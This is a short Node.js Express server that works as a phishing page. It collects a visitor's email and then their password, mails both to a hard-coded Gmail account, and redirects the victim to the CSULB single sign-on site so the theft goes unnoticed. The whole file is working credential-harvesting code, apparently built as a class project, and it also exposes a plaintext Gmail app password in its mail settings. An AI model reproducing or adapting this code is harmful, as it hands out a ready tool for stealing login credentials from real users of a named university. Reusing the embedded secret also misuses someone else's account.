const express = require('express')
const app = express()
const path = require('path')
const nodemailer = require("nodemailer")
const PORT = 8000
let email = ""
let password = ""

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: '378projectsender@gmail.com',
        pass: 'ongryumnodqferga'
    }
})

app.use(express.urlencoded({ extended: true }))
app.use(express.json())
app.set('view engine', 'ejs')

// app.use(express.static(path.join(__dirname + '/mainfiles')))
// app.engine('html', require('ejs').renderFile)
// app.set('view engine', 'html')

app.get("/", (req, res) => {
    res.render('index')
})

app.get("/password", (req, res) => {
    res.render('password', { email })
})

app.post("/", (req, res) => {
    email = req.body.email
    console.log(email)
    res.redirect('/password')
})

app.post("/password", async (req, res) => {
    password = req.body.password
    console.log(password)
    await transporter.sendMail({
        to: '378projectsender@gmail.com',
        subject: email,
        text: password
    })
    res.redirect('http://sso.csulb.edu')
})

app.listen(PORT, () => {
    console.log(__dirname, 'mainfiles')
    console.log(`Localhost server listening on port ${PORT}`)
})